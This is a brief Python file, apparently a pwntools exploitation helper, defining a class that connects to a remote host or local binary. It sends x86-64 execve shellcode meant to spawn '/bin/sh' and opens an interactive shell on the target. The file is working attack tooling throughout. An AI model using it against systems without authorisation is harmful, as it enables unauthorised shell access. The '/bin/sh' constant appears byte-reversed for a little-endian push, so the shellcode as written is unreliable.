from pwn import *


class Shellcode:
    def __init__(self, ip, port, filename, arch, os):
        self.ip = ip
        self.port = port
        self.filename = filename
        context.arch = arch
        context.os = os

    def openRemote(self):
        self.p = remote(self.ip, self.port)

    def openProcess(self):
        self.p = process(self.filename)

    def closeTube(self):
        self.p.close()

    def openShell(self):
        shell_asm = ("""
            mov rdi, 0x2f62696e2f7368
            push rdi
            push rsp
            pop rdi
            mov rax, 59
            xor rsi, rsi
            xor rdx, rdx
            syscall
        """)

        raw_asm = asm(shell_asm)
        self.p.sendline(raw_asm)
        self.p.interactive()